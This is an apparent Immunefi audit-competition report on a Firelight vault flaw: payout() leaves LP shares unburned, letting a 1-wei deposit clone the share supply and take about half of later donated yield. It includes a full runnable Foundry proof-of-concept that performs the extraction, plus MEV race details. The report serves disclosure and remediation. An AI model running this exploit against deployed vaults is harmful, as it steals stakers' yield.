# 90033 sc medium missing share burn in payout allows a 1 wei deposit to clone the entire lp supply and steal half of all subsequent vault yield

**Submitted on Aug 22nd 2026 at 15:31:49 UTC by @BenTimor for** [**Audit Comp | Firelight**](https://immunefi.com/audit-competition/audit-comp-firelight-1)

* **Report ID:** #90033
* **Report Type:** Smart Contract
* **Report severity:** Medium
* **Target:** <https://github.com/immunefi-team/audit-comp-firelight/blob/v1\\_audit\\_ready/contracts/core/FirelightVault.sol>
* **Impacts:**
  * Theft of unclaimed yield

## Description

## Brief/Intro

`FirelightVault.payout()` transfers vault assets to the claim receiver but never burns the corresponding LP shares. After a full payout the vault holds zero assets while the full share supply remains outstanding. Because the ERC-4626 share conversion divides by `totalAssets + 1`, the first deposit after the incident closes — even a single wei — mints `totalSupply + 1` shares, instantly cloning the entire leftover LP book. `VaultRewardDistributor` forwards premiums as plain token donations (no shares minted), so every subsequent donation is split roughly 50/50 between the attacker and the legitimate stakers, and the attacker redeems and claims their half. This is permissionless theft of unclaimed yield: any EOA can backrun `setActiveIncident(false)` with a 1-wei deposit and harvest half of every premium-forwarding cycle until a large recapitalizing deposit occurs.

## Vulnerability Details

### 1. `payout()` drains assets but leaves the share supply untouched

`payout()` (FirelightVault.sol:892) is the vault's claim exit. It computes `paidAmount`, decrements the withdrawal buckets, pushes a total-assets trace, and transfers the asset — but it never burns or otherwise reduces `totalSupply`:

```solidity
// FirelightVault.sol:892-963 (abridged)
function payout(address to, uint256 amount, uint48 captureTimestamp)
    external onlyRole(PAYOUT_ROLE) nonReentrant returns (uint256 paidAmount)
{
    ...
    paidAmount = Math.min(amount, Math.min(assetsAtCapturePeriod, activePayableAmount));
    if (paidAmount > 0) {
        ...
        _traceTotalAssets.push(Time.timestamp(), currentActiveAssets - paidFromActive);
        ...
        IERC20(asset()).safeTransfer(to, paidAmount);   // line 962
    }
    emit PayoutExecuted(to, amount, paidAmount, captureTimestamp);
}
```

When the approved claim equals the active assets, `totalAssets()` becomes 0 while `totalSupply()` remains at the pre-incident level. This state is reachable through entirely legitimate operations — `PAYOUT_ROLE` only pays an approved claim; no operator malfeasance is required.

### 2. The share conversion explodes at zero NAV

`FirelightVault` does not override `_decimalsOffset()`, so the ERC-4626 default of 0 applies. The conversion is:

```solidity
// FirelightVault.sol:1058-1065
function _convertToSharesTotals(
    uint256 assets,
    uint256 totSupply,
    uint256 totAssets,
    Math.Rounding rounding
) private view returns (uint256) {
    return assets.mulDiv(totSupply + 10 ** _decimalsOffset(), totAssets + 1, rounding);
}
```

With `totAssets == 0` and leftover supply `S`:

```
shares = assets × (S + 1) / (0 + 1) = assets × (S + 1)
```

A 1-wei deposit therefore mints `S + 1` shares. The attacker's share count equals the entire pre-existing book, so they own \~50% of the vault from that moment on.

### 3. None of the existing deposit guards fire

```solidity
// FirelightVault.sol:646-670 (abridged)
function deposit(uint256 assets, address receiver) public override ... returns (uint256) {
    if (assets == 0) revert InvalidAmount();                                    // line 658
    if (_hasActiveIncident()) revert CurrentPeriodHasActiveIncident();          // line 660
    (uint256 shares, uint256 _totalSupply, uint256 _totalAssets) = _previewTotals(...);
    if (shares == 0) revert InvalidAmount();                                    // line 669
    ...
}
```

* `assets == 0`: 1 wei is not zero.
* Incident gate: blocks deposits only *while* the incident is active. The moment `INCIDENT_ROLE` calls `setActiveIncident(period, false)` (line 510), deposits are legal again — in the same period.
* `shares == 0` (the guard added for the Macro L-1 zero-share pull): the minted amount is `S + 1`, which is huge, not zero.

### 4. The yield source is a donation, not a mint

`VaultRewardDistributor` does not mint shares; it transfers vault assets directly into the vault (VaultRewardDistributor.sol:13-14, 123-127). These donations increase `totalAssets()` without increasing `totalSupply()`, which is exactly what re-prices the attacker's cloned shares into real value.

### 5. Why the existing tests do not cover this

The team's `test/donations.js` covers only the **empty-vault** case (`totalSupply == 0`), where a deposit floors to zero shares and reverts with `InvalidAmount`. The leftover-supply-at-zero-NAV state is only created by `payout()` and is not exercised by that test. The Macro L-1 finding (zero-share pull) is a different mechanism: there the attacker *loses* their deposit to rounding; here the attacker *gains* the entire supply clone.

### 6. MEV / race

The race is the mempool after `ActiveIncidentUpdated(period, false)`. The first 1-wei deposit wins the full clone (`S + 1` shares). A second 1-wei deposit, while NAV is still 1, also mints `S + 1` shares (since `totalAssets == 1`), so even the runner-up ends up with \~1/3 of subsequent donations. The hot path is cheap: deposit ≈ 187k gas, redeem ≈ 109k gas, claimWithdraw ≈ 38k gas.

## Impact Details

**Impact selected: Theft of unclaimed yield (High).**

The stolen value is the yield stream that `VaultRewardDistributor` forwards to the vault after the incident — premiums and incentives that were supposed to recapitalize the remaining stakers' shares. The principal is not stolen: it already left the vault through the legitimate, approved `payout()`. This matches the program's High row "Theft of unclaimed yield" and deliberately does not claim the Critical row "Direct theft of any user funds ... other than unclaimed yield".

Executed numbers (FXRP, 6 decimals; reproduced in the attached PoC):

| Scenario                     | LP book         | Donation     | Attacker in | Attacker out                     | ROI        |
| ---------------------------- | --------------- | ------------ | ----------- | -------------------------------- | ---------- |
| Base                         | 1,000,000 FXRP  | 100,000 FXRP | 1 wei       | **50,000 FXRP**                  | 5×10¹⁰     |
| Partial slash (NAV = 1 unit) | 1,000,000 FXRP  | 100,000 FXRP | 1 wei       | **\~33,333 FXRP** (33.3% of NAV) | same class |
| V1-scale book                | 60,000,000 FXRP | 250,000 FXRP | 1 wei       | **125,000 FXRP**                 | 1.25×10¹¹  |
| 4 donation cycles            | 1,000,000 FXRP  | 10,000 × 4   | 1 wei       | 5k → 10k → 15k → **20,000 FXRP** | ongoing    |

The theft continues every premium-forwarding cycle until someone makes a large recapitalizing deposit. There is no permission or timing requirement beyond the incident having closed; the attacker is any EOA.

## References

* `FirelightVault.sol` — `payout()` (L892), `deposit()` (L646), `_convertToSharesTotals()` (L1058), `setActiveIncident()` (L510): <https://github.com/immunefi-team/audit-comp-firelight/blob/v1\\_audit\\_ready/contracts/core/FirelightVault.sol>
* `VaultRewardDistributor.sol` — donation flow (L13-14, L123-127): <https://github.com/immunefi-team/audit-comp-firelight/blob/v1\\_audit\\_ready/contracts/core/VaultRewardDistributor.sol>
* Team's donation test (empty-supply case only): <https://github.com/immunefi-team/audit-comp-firelight/blob/v1\\_audit\\_ready/test/donations.js>
* Program page (impact table, known issues): <https://immunefi.com/audit-competition/audit-comp-firelight-1/information/>

## Proof of Concept

## Proof of Concept

Step-by-step (all steps are executed by the self-contained Foundry test inlined below; 7/7 passing against commit `42f9ea5e43d88b35197b901acc2a8c24b314fa62`):

1. **Deploy** `FirelightVault` behind an `ERC1967Proxy` with a 6-decimal mock FXRP asset; grant `PAYOUT_ROLE` and `INCIDENT_ROLE` to test actors; add the claim receiver to the payout allowlist.
2. **Alice deposits** 1,000,000 FXRP → `totalAssets = 1,000,000e6`, `totalSupply = 1,000,000e6`.
3. **Incident opens**: `setActiveIncident(0, true)`.
4. **Approved claim pays out**: `payout(receiver, 1,000,000e6, epoch)` returns the full amount. State: `totalAssets = 0`, `totalSupply = 1,000,000e6` (shares not burned).
5. **Incident closes**: `setActiveIncident(0, false)`.
6. **Attacker deposits 1 wei**: `deposit(1, attacker)` succeeds and mints `1,000,000,000,001` shares (`S + 1`). Attacker now owns \~50% of the supply. (The PoC also proves the gate: the same deposit reverts with `CurrentPeriodHasActiveIncident` while the incident is still active.)
7. **Distributor donates** 100,000 FXRP via a plain `transfer` to the vault → `totalAssets = 100,000e6 + 1`.
8. **Attacker NAV** = `(S+1) × totalAssets / (2S+1)` = **50,000,000,001 units = 50,000 FXRP** — half the donation.
9. **Attacker exits**: `redeem(all shares)` books 50,000,000,001 units; after the withdrawal delay, `claimWithdraw(1)` transfers the full amount. Net profit: 50,000,000,000 units from a 1-wei spend.
10. **Repeatability**: the PoC's multi-cycle test shows the same \~50% take on each of 4 consecutive donations (5,000 → 10,000 → 15,000 → 20,000 FXRP cumulative), and the V1-scale test shows 125,000 FXRP taken from a 250,000 FXRP donation on a 60,000,000 FXRP book.

Self-contained runnable PoC (place at `forge-test/HIGH01_ZeroNavMint.t.sol` in the comp repo; the vault, mock asset, and OpenZeppelin proxy are all in the repo):

```solidity
// SPDX-License-Identifier: MIT
pragma solidity 0.8.28;

import {Test} from "forge-std/Test.sol";
import {ERC1967Proxy} from "@openzeppelin/contracts/proxy/ERC1967/ERC1967Proxy.sol";
import {FirelightVault} from "../contracts/core/FirelightVault.sol";
import {MockERC20} from "../contracts/test/MockERC20.sol";

/// HIGH-01: leftover supply at zero NAV lets 1 wei clone LP book and take ~50% of donated yield.
/// Asset is 6 decimals. Logs print both base units and whole FXRP (units / 1e6).
contract HIGH01_ZeroNavMint is Test {
    uint8 internal constant DECIMALS = 6;
    uint256 internal constant WAD = 10 ** DECIMALS; // 1 FXRP
    uint48 internal constant PERIOD = 1 days;

    FirelightVault internal vault;
    MockERC20 internal asset;

    address internal admin = makeAddr("admin");
    address internal alice = makeAddr("alice");
    address internal attacker = makeAddr("attacker");
    address internal attacker2 = makeAddr("attacker2");
    address internal payoutRole = makeAddr("payout");
    address internal payoutTo = makeAddr("receiver");
    address internal incidentRole = makeAddr("incident");
    address internal distributor = makeAddr("distributor");

    uint48 internal epoch;

    function setUp() public {
        epoch = 1_700_000_000;
        vm.warp(epoch);
        asset = new MockERC20("FXRP", "FXRP", DECIMALS);
        vault = _deployVault(address(new FirelightVault()), 1e24);
    }

    function _deployVault(address impl, uint256 depositLimit) internal returns (FirelightVault v) {
        FirelightVault.InitParams memory params = FirelightVault.InitParams({
            defaultAdmin: admin,
            limitUpdater: admin,
            blocklister: admin,
            pauser: admin,
            periodConfigurationUpdater: admin,
            rescuer: admin,
            depositLimit: depositLimit,
            periodConfigurationDuration: PERIOD
        });
        ERC1967Proxy proxy = new ERC1967Proxy(
            impl,
            abi.encodeCall(FirelightVault.initialize, (asset, "stFXRP", "stFXRP", abi.encode(params)))
        );
        v = FirelightVault(address(proxy));
        vm.startPrank(admin);
        v.grantRole(v.PAYOUT_ROLE(), payoutRole);
        v.grantRole(v.PAYOUT_ALLOWLIST_ROLE(), admin);
        v.grantRole(v.INCIDENT_ROLE(), incidentRole);
        v.addToPayoutAllowlist(payoutTo);
        vm.stopPrank();
    }

    function _deposit(address user, uint256 amount) internal {
        asset.mint(user, amount);
        vm.startPrank(user);
        asset.approve(address(vault), type(uint256).max);
        vault.deposit(amount, user);
        vm.stopPrank();
    }

    function _donate(uint256 amount) internal {
        asset.mint(distributor, amount);
        vm.prank(distributor);
        asset.transfer(address(vault), amount);
    }

    /// Incident on -> payout zeros NAV, leaves supply -> incident off.
    function _slashToZeroNav(uint256 aliceAssets) internal {
        _deposit(alice, aliceAssets);
        vm.prank(incidentRole);
        vault.setActiveIncident(0, true);

        vm.prank(payoutRole);
        uint256 paid = vault.payout(payoutTo, aliceAssets, epoch);
        assertEq(paid, aliceAssets);
        assertEq(vault.totalAssets(), 0);
        assertEq(vault.totalSupply(), aliceAssets, "payout must not burn shares");

        vm.prank(incidentRole);
        vault.setActiveIncident(0, false);
    }

    function _fxrp(uint256 units) internal pure returns (uint256) {
        return units / WAD;
    }

    // 1. Base case + window + extraction + ROI
    function test_base_1weiClonesSupply_extractsHalfDonation() public {
        uint256 lp = 1_000_000 * WAD; // 1,000,000 FXRP
        uint256 donation = 100_000 * WAD; // 100,000 FXRP premiums

        _slashToZeroNav(lp);

        // Window: deposits blocked while incident is live. Re-open to prove the gate.
        vm.prank(incidentRole);
        vault.setActiveIncident(0, true);
        asset.mint(attacker, 1);
        vm.startPrank(attacker);
        asset.approve(address(vault), 1);
        vm.expectRevert(FirelightVault.CurrentPeriodHasActiveIncident.selector);
        vault.deposit(1, attacker);
        vm.stopPrank();
        vm.prank(incidentRole);
        vault.setActiveIncident(0, false);

        _deposit(attacker, 1);

        assertEq(vault.balanceOf(attacker), lp + 1, "1 wei must mint S+1");
        assertEq(vault.totalSupply(), 2 * lp + 1);
        assertEq(vault.totalAssets(), 1);

        _donate(donation);

        uint256 attackerNav = vault.balanceOf(attacker) * vault.totalAssets() / vault.totalSupply();
        emit log_named_uint("attackerNav_FXRP", _fxrp(attackerNav)); // 50000

        // ~50% of donation to the sniper.
        assertGe(attackerNav, donation / 2 - 1);
        assertLe(attackerNav, donation / 2 + WAD);

        uint256 shares = vault.balanceOf(attacker);
        vm.prank(attacker);
        uint256 booked = vault.redeem(shares, attacker, attacker);
        assertGe(booked, donation / 2 - 1);

        vm.warp(epoch + 2 * PERIOD + 1);
        vm.prank(attacker);
        uint256 received = vault.claimWithdraw(1);

        uint256 spent = 1;
        uint256 profit = received - spent;
        emit log_named_uint("attackerReceived_FXRP", _fxrp(received)); // 50000
        emit log_named_uint("ROI_x", profit / spent); // 50000000000

        assertEq(received, booked);
        assertGe(received, donation / 2 - 1);
        assertGt(profit, 0);
    }

    // 2. Partial slash: leftover NAV tiny vs supply
    function test_partialSlash_1weiMintsHugeShareOfLaterYield() public {
        uint256 lp = 1_000_000 * WAD;
        uint256 leftover = 1; // 1 base unit remains (near-total slash)
        uint256 donation = 100_000 * WAD;

        _deposit(alice, lp);
        vm.prank(payoutRole);
        vault.payout(payoutTo, lp - leftover, epoch);
        assertEq(vault.totalAssets(), leftover);
        assertEq(vault.totalSupply(), lp);

        _deposit(attacker, 1);
        uint256 sniperShares = vault.balanceOf(attacker);
        // shares = 1 * (S+1) / (A+1) = (lp+1) / 2
        assertEq(sniperShares, (lp + 1) / (leftover + 1));

        _donate(donation);
        uint256 attackerNav = sniperShares * vault.totalAssets() / vault.totalSupply();
        emit log_named_uint("attackerNav_FXRP_partial", _fxrp(attackerNav)); // 33333
        emit log_named_uint("attackerPct_bps", attackerNav * 10_000 / vault.totalAssets()); // 3333
        assertGe(attackerNav * 10_000 / vault.totalAssets(), 3_000); // at least ~30% of post-donation NAV
    }

    // 3. V1-scale book (~60M FXRP)
    function test_v1Scale_60mFxrp_halfOfPremiumStream() public {
        uint256 lp = 60_000_000 * WAD;
        uint256 donation = 250_000 * WAD;

        _slashToZeroNav(lp);
        _deposit(attacker, 1);
        assertEq(vault.balanceOf(attacker), lp + 1);

        _donate(donation);
        uint256 attackerNav = vault.balanceOf(attacker) * vault.totalAssets() / vault.totalSupply();
        emit log_named_uint("v1_attackerNav_FXRP", _fxrp(attackerNav)); // 125000

        assertGe(attackerNav, donation / 2 - 1);
        assertGe(_fxrp(attackerNav), 124_999);
    }

    // 4. Multiple donations: theft continues until a large recap
    function test_multipleDonations_ongoingUntilRecap() public {
        uint256 lp = 1_000_000 * WAD;
        uint256 perCycle = 10_000 * WAD;

        _slashToZeroNav(lp);
        _deposit(attacker, 1);

        uint256 acc;
        for (uint256 i; i < 4; ++i) {
            _donate(perCycle);
            uint256 nav = vault.balanceOf(attacker) * vault.totalAssets() / vault.totalSupply();
            emit log_named_uint("cycle", i);
            emit log_named_uint("sniperNav_FXRP", _fxrp(nav)); // 5000, 10000, 15000, 20000
            acc = nav;
        }
        assertGe(acc, (4 * perCycle) / 2 - WAD);
    }

    // 5. MEV: first deposit after close wins the clone; second 1-wei is worse but not zero
    function test_mev_firstDepositAfterCloseWinsClone() public {
        uint256 lp = 1_000_000 * WAD;
        _slashToZeroNav(lp);

        _deposit(attacker, 1);
        uint256 firstShares = vault.balanceOf(attacker);
        _deposit(attacker2, 1);
        uint256 secondShares = vault.balanceOf(attacker2);

        assertEq(firstShares, lp + 1);
        assertGt(firstShares, 0);
        assertGt(secondShares, 0);

        _donate(100_000 * WAD);
        uint256 firstNav = firstShares * vault.totalAssets() / vault.totalSupply();
        uint256 secondNav = secondShares * vault.totalAssets() / vault.totalSupply();
        emit log_named_uint("firstNav_FXRP", _fxrp(firstNav)); // 33333
        emit log_named_uint("secondNav_FXRP", _fxrp(secondNav)); // 33333
        assertGt(firstNav, 0);
        assertGt(secondNav, 0);
    }

    // 6. Empty-supply donation (donations.js) is NOT this bug
    function test_emptySupplyDonation_notThisBug() public {
        _donate(1_000_000 * WAD);
        asset.mint(alice, 1_000_000 * WAD);
        vm.startPrank(alice);
        asset.approve(address(vault), 1_000_000 * WAD);
        vm.expectRevert(FirelightVault.InvalidAmount.selector);
        vault.deposit(1_000_000 * WAD, alice);
        vm.stopPrank();
        assertEq(vault.balanceOf(attacker), 0);
    }

    // 7. Guard predicate (unpatched vault currently ALLOWS this)
    function test_unpatched_deposit1SucceedsWhenZeroNavLeftoverSupply() public {
        _slashToZeroNav(1_000 * WAD);
        assertEq(vault.totalAssets(), 0);
        assertGt(vault.totalSupply(), 0);
        _deposit(attacker, 1);
        assertEq(vault.balanceOf(attacker), 1_000 * WAD + 1);
    }
}
```

Run command:

```bash
forge test --match-path forge-test/HIGH01_ZeroNavMint.t.sol -vv \
  --skip 'contracts/fasset/**' --skip 'contracts/legacy/**' \
  --remappings 'forge-std/=lib/forge-std/src/'
```

Result: **7/7 passing** (base extraction, partial slash, V1-scale, multi-cycle, MEV race, empty-supply negative control, unpatched guard predicate).

## Recommendation

Revert `deposit()` and `mint()` when the vault is in the zero-NAV leftover-supply state:

```solidity
if (totalAssets() == 0 && totalSupply() > 0) revert InvalidAmount();
```

Alternatively (or additionally), burn the shares corresponding to the paid-out assets inside `payout()`, so the share supply always tracks the assets that remain.
